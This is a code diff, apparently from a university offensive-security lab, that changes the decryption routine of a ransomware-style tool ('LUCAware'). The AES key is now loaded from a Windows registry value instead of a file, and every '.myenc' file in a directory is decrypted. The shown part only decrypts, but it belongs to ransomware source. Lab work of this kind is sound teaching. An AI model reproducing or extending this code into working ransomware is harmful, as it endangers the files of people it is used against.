@@ -1,26 +1,23 @@
+#include <windows.h>
+#include <winreg.h>
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <dirent.h>
 #include <mbedtls/aes.h>
 
+#include "store_in_register.h"
+
 #define AES_KEY_SIZE 16       // 128-bit AES
 #define IV_SIZE 16            // same as in your encrypt function
 #define BUFFER_SIZE 4096      // same buffer size
+#define REG_PATH "Software\\LUCAware"
+#define DECRYPTION_KEY_NAME "DecryptionKey"
 
 void handle_error(const char *msg) {
     perror(msg);
     exit(EXIT_FAILURE);
-}
-
-int read_aes_key(const char *key_file, unsigned char *key, size_t key_size) {
-    FILE *f = fopen(key_file, "rb");
-    if (!f) return -1;
-
-    size_t n = fread(key, 1, key_size, f);
-    fclose(f);
-
-    return n == key_size ? 0 : -1;
 }
 
 void decrypt_file(const char *source, const char *target, const unsigned char *key) {
@@ -87,10 +84,10 @@ void decrypt_all_myenc_files_in_dir(const char *files_dir, const unsigned char *
             continue;
 
         // Build full source path
-        snprintf(source_path, sizeof(source_path), "%s/%s", files_dir, entry->d_name);
+        snprintf(source_path, sizeof(source_path), "%s\\%s", files_dir, entry->d_name);
 
         // Build target path by stripping ".myenc"
-        snprintf(target_path, sizeof(target_path), "%s/%.*s", files_dir, (int)(name_len - ext_len), entry->d_name);
+        snprintf(target_path, sizeof(target_path), "%s\\%.*s", files_dir, (int)(name_len - ext_len), entry->d_name);
 
         decrypt_file(source_path, target_path, key);
         printf("Decrypted: %s -> %s\n", source_path, target_path);
@@ -101,12 +98,16 @@ void decrypt_all_myenc_files_in_dir(const char *files_dir, const unsigned char *
 
 /* Example usage */
 int attack_decrypt() {
-    unsigned char key[AES_KEY_SIZE];
+     unsigned char key[AES_KEY_SIZE];
 
-    if (read_aes_key("decryption_key.bin", key, AES_KEY_SIZE) != 0)
+    storage_context_t ctx = { REG_PATH };
+
+    /* Load AES key from registry */
+    if (load_value(&ctx, DECRYPTION_KEY_NAME, key, AES_KEY_SIZE) != 0) {
         return -1;
+    }
 
-    decrypt_all_myenc_files_in_dir("encrypted_files", key);
+    decrypt_all_myenc_files_in_dir("C:/Users/20231367/OneDrive - TU Eindhoven/Documents/Y3Q2/2IC80 Lab on Offensive Security/dll_injection/build", key);
 
     return 0;
 }
